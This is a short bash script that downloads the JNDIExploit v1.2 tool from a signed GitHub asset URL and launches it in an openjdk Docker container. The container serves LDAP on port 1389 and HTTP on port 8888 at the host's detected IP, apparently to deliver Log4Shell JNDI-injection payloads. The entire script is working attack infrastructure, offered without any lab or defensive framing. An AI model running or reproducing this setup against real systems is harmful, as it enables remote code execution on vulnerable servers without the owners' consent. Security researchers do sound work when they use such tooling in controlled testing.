#!/bin/bash -ex

if [[ ! -d JNDIExploit.v1.2 ]] ; then
    if [[ ! -f JNDIExploit.v1.2.zip ]] ; then
        wget 'https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream'
    fi
    mkdir JNDIExploit.v1.2
    cd JNDIExploit.v1.2
    unzip ../JNDIExploit.v1.2.zip
fi

HOST_IP="$( ifconfig | grep "\binet\b" | grep -vF 127.0.0.1 | head -1 | sed -e 's/.*inet  *//' -e 's/ .*//' )"

docker pull openjdk
docker run \
    -it \
    --rm \
    -p 8888:8888 \
    -p 1389:1389 \
    --volume "$PWD/JNDIExploit.v1.2:/JNDIExploit.v1.2" \
    --name JNDIExploit-1.2 \
    openjdk \
    java -jar /JNDIExploit.v1.2/JNDIExploit-1.2-SNAPSHOT.jar -i "$HOST_IP" -p 8888
